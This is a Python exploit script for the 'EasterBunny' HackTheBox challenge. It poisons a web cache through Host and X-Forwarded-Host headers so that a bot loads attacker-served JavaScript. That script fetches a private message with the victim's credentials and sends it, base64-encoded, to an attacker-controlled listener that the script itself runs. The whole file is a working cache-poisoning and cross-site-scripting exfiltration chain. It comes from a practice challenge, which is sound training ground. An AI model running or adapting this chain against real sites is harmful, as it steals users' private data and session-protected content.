import requests, base64, argparse, threading, json, sys
from http.server import HTTPServer, BaseHTTPRequestHandler

parser = argparse.ArgumentParser(description = 'Exploit of EasterBunny challenge from HackTheBox')
parser.add_argument('-lhost', action='store', dest = 'lhost', required = True, help = 'Attacker IP (It must be accessible via the internet)')
parser.add_argument('-rhost', action='store', dest = 'rhost', required = True, help = 'Challenge IP')
arguments = parser.parse_args()

JS_PAYLOAD = "fetch(`http://127.0.0.1/message/3`, { credentials: 'include' }).then((rsp) => rsp.json()).then((obj) => fetch(`"+arguments.lhost+"/?base64=${btoa((JSON.stringify(obj)))}`))"
LHOST      = "0.0.0.0"
WEB_PORT   = 8000

r = requests.Session()
cache_event = threading.Event() 

def trigger_message():
    resp = r.post(f"{arguments.rhost}/submit", json={"message":"Get flag"}, headers={"Content-Type":"application/json"})
    last_message = resp.json().get('message')
    return last_message

def trigger_cache():
    headers = {"Content-Type":"application/json", "Host": "127.0.0.1", "X-Forwarded-Host": ""+arguments.lhost.split("/")[2]}
    last_message = str(trigger_message()+1)

    for num in range(10):
        resp = r.get(f"{arguments.rhost}/letters?id="+last_message, json={"message":"Get flag"}, headers=headers)

        if resp.headers['X-Cache'] != "MISS":
            trigger_message()
            break
        else:
            continue

def start_web_server():
    class MyHandler(BaseHTTPRequestHandler):

        def do_GET(self):
            if self.path.endswith('/viewletter.js'):
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(JS_PAYLOAD)))
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(JS_PAYLOAD.encode())
        
            elif self.path.startswith('/?base64='):
                resp = self.path.split("/?base64=")[1]
                plain_page = base64.b64decode(resp).decode()
                cache_event.set()
                return r.headers.update({"Message": ""+plain_page})

            else:
                self.send_response(403)
    
    httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)
    threading.Thread(target=httpd.serve_forever).start()
    print(f"Listing on {LHOST}:{str(WEB_PORT)}")


if __name__ == "__main__":

    start_web_server()
    trigger_cache()
    
    cache_event.wait()
    
    message = json.loads(r.headers['Message'])
    print("Message 3: "+ message["message"])
